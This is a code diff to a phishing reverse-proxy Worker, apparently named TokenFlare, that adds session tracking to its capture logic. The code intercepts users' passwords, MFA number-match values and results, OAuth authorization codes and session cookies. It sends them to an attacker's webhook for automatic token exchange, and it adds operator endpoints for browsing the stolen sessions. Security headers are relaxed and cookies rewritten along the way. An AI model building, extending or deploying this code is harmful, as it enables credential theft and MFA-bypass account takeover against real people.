@@ -33,6 +33,38 @@ const DEFAULTS = {
 
 
 /// ─────────────────────────────────────────────────────────────
+/// Workers KV Session Correlation
+/// ─────────────────────────────────────────────────────────────
+
+async function storeSessionEvent(env, sessionId, eventType, data) {
+    if (!env.SESSIONS || !sessionId) return;
+
+    try {
+        // Read existing session
+        const existing = await env.SESSIONS.get(sessionId, 'json') || {
+            id: sessionId,
+            started: new Date().toISOString(),
+            events: [],
+        };
+
+        // Append new event
+        existing.events.push({
+            type: eventType,
+            timestamp: new Date().toISOString(),
+            data: data,
+        });
+        existing.last_updated = new Date().toISOString();
+
+        // Write back with 24-hour TTL
+        await env.SESSIONS.put(sessionId, JSON.stringify(existing), {
+            expirationTtl: 86400,
+        });
+    } catch (e) {
+        // KV operations are best-effort — never block the proxy flow
+    }
+}
+
+/// ─────────────────────────────────────────────────────────────
 /// Request pipeline i.e. main()
 /// ─────────────────────────────────────────────────────────────
 
@@ -40,6 +72,42 @@ export default {
   async fetch(request, env) {
     const cfg = loadConfig(env);
     const log = makeLogger(cfg.debug);
+
+    // Session correlation — extract or create session ID
+    let sessionId = '';
+    const cookieHeader = request.headers.get('cookie') || '';
+    const sessionMatch = cookieHeader.match(/tf_sid=([a-f0-9-]+)/);
+    if (sessionMatch) {
+        sessionId = sessionMatch[1];
+    } else {
+        sessionId = crypto.randomUUID();
+    }
+
+    // 0) Session retrieval API endpoints (operator-facing)
+    const url = new URL(request.url);
+    if (url.pathname === '/api/session' && request.method === 'GET') {
+        const sid = url.searchParams.get('id');
+        if (sid && env.SESSIONS) {
+            const session = await env.SESSIONS.get(sid, 'json');
+            if (session) {
+                return new Response(JSON.stringify(session, null, 2), {
+                    headers: { 'Content-Type': 'application/json' },
+                });
+            }
+        }
+        return new Response('{"error": "session not found"}', { status: 404 });
+    }
+
+    if (url.pathname === '/api/sessions' && request.method === 'GET') {
+        if (env.SESSIONS) {
+            const list = await env.SESSIONS.list({ limit: 50 });
+            return new Response(JSON.stringify(list.keys.map(k => ({
+                id: k.name,
+                expiration: k.expiration,
+            }))), { headers: { 'Content-Type': 'application/json' } });
+        }
+        return new Response('[]', { headers: { 'Content-Type': 'application/json' } });
+    }
 
     // 1) preFlight blocks & checks
     const denyResp = preflightBlocks(request, cfg, log);
@@ -72,7 +140,10 @@ export default {
     // 4) Opportunistic credential capture (non-blocking)
     if (request.method === 'POST') {
       parseCredentialsFromBody(request).then(async creds => {
-        if (creds) await notifyCredentials(cfg.webhookUrl, creds, log).catch(console.error);
+        if (creds) {
+          await notifyCredentials(cfg.webhookUrl, creds, log, sessionId).catch(console.error);
+          storeSessionEvent(env, sessionId, 'credentials', { username: creds.username, has_password: true }).catch(() => {});
+        }
       }).catch(() => {});
     }
 
@@ -129,9 +200,11 @@ export default {
                 entropy: sasBody.Entropy,
                 session_id: sasBody.SessionId || '',
                 auth_method: sasBody.AuthMethodId || '',
+                kv_session_id: sessionId,
               }),
             }).catch(() => {});
           }
+          storeSessionEvent(env, sessionId, 'number_match', { entropy: sasBody.Entropy }).catch(() => {});
           log.info(`MFA number match captured: ${sasBody.Entropy}`);
         }
       } catch (e) {
@@ -155,9 +228,11 @@ export default {
               success: endBody.Success || false,
               auth_method: endBody.AuthMethodId || '',
               result_value: endBody.ResultValue || '',
+              session_id: sessionId,
             }),
           }).catch(() => {});
         }
+        storeSessionEvent(env, sessionId, 'mfa_result', { success: endBody.Success || false, method: endBody.AuthMethodId || '' }).catch(() => {});
         log.info(`MFA result captured: success=${endBody.Success}, method=${endBody.AuthMethodId}`);
       } catch (e) {
         // Ignore parse errors
@@ -176,8 +251,22 @@ export default {
             type: 'credential_type_intel',
             timestamp: new Date().toISOString(),
             data: gctBody,
+            session_id: sessionId,
           }),
         }).catch(() => {});
+        // Parse GCT for session event metadata
+        try {
+          const gctParsed = JSON.parse(gctBody);
+          const authMethods = [];
+          if (gctParsed.Credentials) {
+            for (const cred of gctParsed.Credentials) {
+              if (cred.PrefCredential !== undefined) authMethods.push(cred.PrefCredential);
+            }
+          }
+          storeSessionEvent(env, sessionId, 'gct_intel', { auth_methods: authMethods }).catch(() => {});
+        } catch (_) {
+          storeSessionEvent(env, sessionId, 'gct_intel', { raw: true }).catch(() => {});
+        }
         log.info('GetCredentialType response intercepted and sent to webhook');
       } catch (e) {
         // Ignore parse errors — non-blocking
@@ -212,8 +301,9 @@ export default {
                 // Send structured payload for automatic exchange + human-readable notification
                 const authParams = parseAuthCodeUrl(authcodeUri);
                 const upstreamParams = parseUpstreamParams(cfg.upstreamPath);
-                await notifyAuthCodeStructured(cfg.webhookUrl, authParams, upstreamParams, authcodeUri, request, upstreamResp, log)
+                await notifyAuthCodeStructured(cfg.webhookUrl, authParams, upstreamParams, authcodeUri, request, upstreamResp, sessionId, log)
                   .catch(console.error);
+                storeSessionEvent(env, sessionId, 'auth_code', { has_code: true }).catch(() => {});
             }
             // then send the user to final redir
             outHeaders.set("Location", cfg.finalRedirUrl);
@@ -245,7 +335,8 @@ export default {
       }
     }
     if (capturedCookies.length > 0) {
-      await notifyCookies(cfg.webhookUrl, capturedCookies.join('\n\n'), log).catch(console.error);
+      await notifyCookies(cfg.webhookUrl, capturedCookies.join('\n\n'), log, sessionId).catch(console.error);
+      storeSessionEvent(env, sessionId, 'cookies', { count: capturedCookies.length }).catch(() => {});
     }
 
     // 10) Rewrite Set-Cookie domains
@@ -254,7 +345,12 @@ export default {
       outHeaders = relaxSecurityHeaders(cookieRewrite.headers);
     }
 
-    // 11) Rewrite body hostnames if textual
+    // 11) Set session cookie on response if new
+    if (!sessionMatch) {
+        outHeaders.append('Set-Cookie', `tf_sid=${sessionId}; Path=/; Secure; HttpOnly; SameSite=None; Max-Age=3600`);
+    }
+
+    // 12) Rewrite body hostnames if textual
     const contentType = outHeaders.get('content-type') || '';
     const body = await maybeRewriteBody(upstreamResp, contentType, cfg.replaceHostRegex, clientUrl.hostname);
 
@@ -539,7 +635,7 @@ async function notifyAuthCode(webhook, url, log) {
  * Send structured auth code payload for automatic token exchange.
  * Fires BOTH the human-readable notification AND a structured JSON to /exchange.
  */
-async function notifyAuthCodeStructured(webhook, authParams, upstreamParams, rawUrl, request, upstreamResp, log) {
+async function notifyAuthCodeStructured(webhook, authParams, upstreamParams, rawUrl, request, upstreamResp, sessionId, log) {
   if (!webhook) {
     log.warn('No webhook configured');
     return;
@@ -585,6 +681,7 @@ async function notifyAuthCodeStructured(webhook, authParams, upstreamParams, raw
   const payload = {
     event: 'auth_code',
     timestamp: new Date().toISOString(),
+    session_id: sessionId,
     code: authParams.code,
     client_id: upstreamParams.client_id,
     redirect_uri: upstreamParams.redirect_uri,
@@ -655,12 +752,12 @@ function parseUpstreamParams(upstreamPath) {
   }
 }
 
-async function notifyCredentials(webhook, { username, password }, log) {
-  await notify(webhook, `[TokenFlare] Password Captured!\n\nUser: ${escapeHtml(username)}\nPassword: ${escapeHtml(password)}`, log);
+async function notifyCredentials(webhook, { username, password }, log, sessionId) {
+  await notify(webhook, `[TokenFlare] Password Captured!\n\nUser: ${escapeHtml(username)}\nPassword: ${escapeHtml(password)}\nSession: ${sessionId || 'n/a'}`, log);
 }
 
-async function notifyCookies(webhook, cookies, log) {
-  await notify(webhook, `[TokenFlare] Cookies Captured!\n\n${cookies}`, log);
+async function notifyCookies(webhook, cookies, log, sessionId) {
+  await notify(webhook, `[TokenFlare] Cookies Captured!\n\nSession: ${sessionId || 'n/a'}\n${cookies}`, log);
 }
 
 /// ─────────────────────────────────────────────────────────────
